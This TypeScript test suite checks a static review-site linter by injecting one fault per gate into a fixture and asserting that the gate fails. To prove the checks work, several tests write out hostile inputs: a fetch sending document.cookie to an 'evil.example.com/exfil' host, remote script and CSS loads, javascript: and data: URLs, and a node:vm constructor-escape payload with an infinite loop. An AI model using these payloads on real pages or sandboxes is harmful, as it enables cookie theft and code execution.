import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { cp, mkdtemp, readFile, rm, writeFile, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { join } from "node:path";
import { describe, it } from "node:test";
import { checkReviewSite, type GateId, type ReviewSiteReport } from "./check.js";
import { resolveArtifactRefs } from "../harness/provenance/index.js";

const FIXTURE = fileURLToPath(new URL("../../validation/fixtures/review-site", import.meta.url));

function gate(report: ReviewSiteReport, id: GateId): { ok: boolean; detail: string } {
  const f = report.findings.find((x) => x.gate === id);
  assert.ok(f, `report missing ${id}`);
  return f;
}

/** Copy the clean Lane 0 fixture into a scratch dir a test can mutate. */
async function scratchFixture(): Promise<{ dir: string; cleanup: () => Promise<void> }> {
  const root = await mkdtemp(join(tmpdir(), "review-site-check-"));
  const dir = join(root, "review-site");
  await cp(FIXTURE, dir, { recursive: true });
  return { dir, cleanup: () => rm(root, { recursive: true, force: true }) };
}

async function edit(dir: string, rel: string, fn: (s: string) => string): Promise<void> {
  const p = join(dir, rel);
  await writeFile(p, fn(await readFile(p, "utf8")));
}

describe("check_review_site — clean Lane 0 fixture passes G1-G8", () => {
  it("every gate is ok on the contract-clean fixture", async () => {
    const report = await checkReviewSite({ siteDir: FIXTURE, cdnAllowlist: [] });
    for (const f of report.findings) {
      assert.equal(f.ok, true, `${f.gate} should pass clean: ${f.detail}`);
    }
    assert.equal(report.ok, true);
    assert.deepEqual(
      report.findings.map((f) => f.gate),
      ["G1", "G2", "G3", "G4", "G5", "G6", "G7", "G8"],
    );
  });
});

describe("check_review_site — one mutation per gate fails exactly that gate", () => {
  it("G1: dropping index.html fails G1", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await rm(join(dir, "index.html"));
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G1").ok, false);
      assert.equal(report.ok, false);
    } finally {
      await cleanup();
    }
  });

  it("G2: an absolute path in index.html fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('href="assets/app.css"', 'href="/assets/app.css"'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /absolute/);
    } finally {
      await cleanup();
    }
  });

  it("G2: a `..` traversal path fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('src="assets/app.js"', 'src="../assets/app.js"'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false);
      assert.match(gate(report, "G2").detail, /\.\./);
    } finally {
      await cleanup();
    }
  });

  it("G3: removing a declared data global fails G3", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // Neutralise the window.REVIEW_DATA assignment while manifest still
      // declares it in data_globals.
      await writeFile(join(dir, "data", "values.js"), "// no global assigned here\nvoid 0;\n");
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G3").ok, false, gate(report, "G3").detail);
      assert.match(gate(report, "G3").detail, /REVIEW_DATA/);
    } finally {
      await cleanup();
    }
  });

  it("G4: a getElementById with no matching element fails G4", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "assets/app.js", (s) =>
        s.replace(
          'tbody: document.getElementById("rows-body"),',
          'tbody: document.getElementById("does-not-exist"),',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G4").ok, false, gate(report, "G4").detail);
      assert.match(gate(report, "G4").detail, /does-not-exist/);
    } finally {
      await cleanup();
    }
  });

  it("G5: a local fetch of a .json path fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "assets/app.js", (s) =>
        s.replace('"use strict";', '"use strict";\n  fetch("data/values.json");'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /fetch/);
    } finally {
      await cleanup();
    }
  });

  it("G6: an external origin not in cdn_allowlist fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<script src="assets/app.js"></script>',
          '<script src="https://cdn.evil.example.com/x.js"></script>\n<script src="assets/app.js"></script>',
        ),
      );
      const denied = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(denied, "G6").ok, false, gate(denied, "G6").detail);
      assert.match(gate(denied, "G6").detail, /cdn\.evil\.example\.com/);

      // Same site passes G6 once the origin is allowlisted (protocol policy).
      const allowed = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: ["https://cdn.evil.example.com"],
      });
      assert.equal(gate(allowed, "G6").ok, true, gate(allowed, "G6").detail);
    } finally {
      await cleanup();
    }
  });

  it("G7: removing the export/schema surface fails G7", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // Strip the export button from the page and the download+schema surface
      // from app.js.
      await edit(dir, "index.html", (s) =>
        s.replace(/<button id="export-btn"[^>]*>[\s\S]*?<\/button>/, ""),
      );
      await edit(dir, "assets/app.js", (s) =>
        s
          .replace(/link\.download = "verdict\.json";/g, 'link.setAttribute("data-x", "1");')
          .replace(/schema: manifest\.verdict_schema,/g, "kind: 1,"),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G7").ok, false, gate(report, "G7").detail);
    } finally {
      await cleanup();
    }
  });

  it("G8: a produced_from hash / sample_id that does not match the run fails G8", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // Build a run measurements file and a manifest that faithfully names it,
      // then mutate the manifest to prove the fidelity check catches drift.
      const resultsPath = join(dir, "results.json");
      const resultsBytes = JSON.stringify({ sample_id: "toy-run-1", slope: 0.12, n: 200 });
      await writeFile(resultsPath, resultsBytes);
      const hash = createHash("sha256").update(resultsBytes).digest("hex");

      const faithful = `window.REVIEW_MANIFEST = {\n  sample_id: "toy-run-1",\n  produced_from: { measurement: "results.json@${hash}" },\n  verdict_schema: "review-verdict/1",\n  data_globals: ["REVIEW_MANIFEST", "REVIEW_DATA"],\n};\n`;
      await writeFile(join(dir, "data", "manifest.js"), faithful);
      const ok = await checkReviewSite({ siteDir: dir, cdnAllowlist: [], resultsPath });
      assert.equal(gate(ok, "G8").ok, true, gate(ok, "G8").detail);

      // Mismatched sample_id.
      await writeFile(
        join(dir, "data", "manifest.js"),
        faithful.replace('sample_id: "toy-run-1"', 'sample_id: "wrong-sample"'),
      );
      const badId = await checkReviewSite({ siteDir: dir, cdnAllowlist: [], resultsPath });
      assert.equal(gate(badId, "G8").ok, false, gate(badId, "G8").detail);
      assert.match(gate(badId, "G8").detail, /sample_id/);

      // Mismatched produced_from hash (stale site).
      const staleHash = "0".repeat(64);
      await writeFile(
        join(dir, "data", "manifest.js"),
        faithful.replace(`@${hash}`, `@${staleHash}`),
      );
      const badHash = await checkReviewSite({ siteDir: dir, cdnAllowlist: [], resultsPath });
      assert.equal(gate(badHash, "G8").ok, false, gate(badHash, "G8").detail);
      assert.match(gate(badHash, "G8").detail, /hash/);
    } finally {
      await cleanup();
    }
  });
});

describe("review-artifact provenance node — resolveArtifactRefs yields a first-class chain node", () => {
  it("resolves the phase inputs/outputs to hashed provenance refs", async () => {
    const root = await mkdtemp(join(tmpdir(), "review-artifact-prov-"));
    const taskDir = join(root, "task");
    try {
      // Minimal task tree: upstream measurement + a produced review site.
      await mkdir(join(taskDir, "artifacts", "regression"), { recursive: true });
      await cp(FIXTURE, join(taskDir, "artifacts", "review-site"), { recursive: true });
      await writeFile(
        join(taskDir, "artifacts", "regression", "regression.json"),
        JSON.stringify({ slope: 0.12, intercept: 0.4, r_squared: 0.55, n: 200 }),
      );

      // Same declared paths the review-artifact phase carries, resolved the way
      // runGate builds the provenance entry (via resolveArtifactRefs).
      const inputs = await resolveArtifactRefs(taskDir, ["regression/regression.json"]);
      const outputs = await resolveArtifactRefs(taskDir, [
        "review-site/index.html",
        "review-site/data/manifest.js",
      ]);

      assert.equal(inputs[0]?.path, "artifacts/regression/regression.json");
      assert.match(String(inputs[0]?.hash), /^[0-9a-f]{12,}$/);
      assert.deepEqual(
        outputs.map((o) => o.path),
        ["artifacts/review-site/index.html", "artifacts/review-site/data/manifest.js"],
      );
      for (const o of outputs) {
        assert.match(String(o.hash), /^[0-9a-f]{12,}$/, `${o.path} should be hashed`);
      }
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
});

describe("check_review_site — parse-don't-execute closes the bypass classes", () => {
  it("H2: a malicious data/*.js is NOT executed and the linter still terminates", async () => {
    const { dir, cleanup } = await scratchFixture();
    const sentinel = "__REVIEW_SITE_PWNED__";
    try {
      // The old linter ran this in node:vm — a constructor escape to the real
      // global + an infinite loop (RCE + DoS in the reviewer's process). Static
      // parsing must neither set the sentinel nor hang.
      await writeFile(
        join(dir, "data", "evil.js"),
        `this.constructor.constructor("globalThis.${sentinel} = true")();\nwhile (true) {}\n`,
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(sentinel in globalThis, false, "producer code must not execute");
      // The file assigns no window.* global, so G3 flags it (handled, not run).
      assert.equal(gate(report, "G3").ok, false, gate(report, "G3").detail);
    } finally {
      delete (globalThis as Record<string, unknown>)[sentinel];
      await cleanup();
    }
  });

  it("bypass: an UNQUOTED external script src fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<script src="assets/app.js"></script>',
          "<script src=https://cdn.evil.example.com/x.js></script>\n<script src=\"assets/app.js\"></script>",
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /cdn\.evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a data: URL on a <script> fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<script src="assets/app.js"></script>',
          '<script src="data:text/javascript,alert(1)"></script>\n<script src="assets/app.js"></script>',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /data:/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a javascript: href fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('<div class="shell">', '<a href="javascript:alert(1)">x</a>\n<div class="shell">'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /script-URL/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a CSS @import of an external origin fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace("</head>", '<style>@import "https://fonts.evil.example.com/x.css";</style>\n</head>'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /fonts\.evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: an inline style url() of an external origin fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('<div class="shell">', '<div class="shell" style="background:url(https://track.evil.example.com/p.png)">'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /track\.evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: an external fetch (concatenated, non-literal) fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "assets/app.js", (s) =>
        s.replace('"use strict";', '"use strict";\n  fetch("https://evil.example.com/exfil?d=" + document.cookie);'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /fetch/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a dynamic import() fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "assets/app.js", (s) =>
        s.replace('"use strict";', '"use strict";\n  import("https://evil.example.com/x.js");'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /import/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a dangling relative href (no file) fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('href="assets/app.css"', 'href="assets/missing.css"'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /missing file/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: an inline <script> with a bad getElementById fails G4", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<script src="data/manifest.js"></script>',
          '<script>document.getElementById("ghost-node");</script>\n<script src="data/manifest.js"></script>',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G4").ok, false, gate(report, "G4").detail);
      assert.match(gate(report, "G4").detail, /ghost-node/);
    } finally {
      await cleanup();
    }
  });
});

describe("check_review_site — G8 fidelity fails when required-but-unverifiable (H1/H1b)", () => {
  it("H1: requireFidelity with no measurement on disk fails G8", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // Manifest names a measurement that isn't present under measurementsRoot.
      await writeFile(
        join(dir, "data", "manifest.js"),
        `window.REVIEW_MANIFEST = {\n  sample_id: "task-x",\n  produced_from: { measurement: "measurements/results.json@${"a".repeat(64)}" },\n  verdict_schema: "review-verdict/1",\n  data_globals: ["REVIEW_MANIFEST", "REVIEW_DATA"],\n};\n`,
      );
      const report = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: [],
        measurementsRoot: dir,
        expectedSampleId: "task-x",
        requireFidelity: true,
      });
      assert.equal(report.fidelity, "unverified");
      assert.equal(gate(report, "G8").ok, false, gate(report, "G8").detail);
      assert.match(gate(report, "G8").detail, /fidelity required/);
    } finally {
      await cleanup();
    }
  });

  it("H1b: a manifest sample_id that isn't the harness run id fails G8", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      const resultsRel = join("measurements", "results.json");
      await mkdir(join(dir, "measurements"), { recursive: true });
      const bytes = JSON.stringify({ slope: 0.12, n: 200 }); // toy stats: no sample_id
      await writeFile(join(dir, resultsRel), bytes);
      const hash = createHash("sha256").update(bytes).digest("hex");
      await writeFile(
        join(dir, "data", "manifest.js"),
        `window.REVIEW_MANIFEST = {\n  sample_id: "attacker-picked",\n  produced_from: { measurement: "measurements/results.json@${hash}" },\n  verdict_schema: "review-verdict/1",\n  data_globals: ["REVIEW_MANIFEST", "REVIEW_DATA"],\n};\n`,
      );
      const report = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: [],
        measurementsRoot: dir,
        expectedSampleId: "task-2026-07-09-001",
        requireFidelity: true,
      });
      assert.equal(report.fidelity, "verified", "hash matched, so fidelity is verified");
      assert.equal(gate(report, "G8").ok, false, gate(report, "G8").detail);
      assert.match(gate(report, "G8").detail, /run id/);
    } finally {
      await cleanup();
    }
  });
});
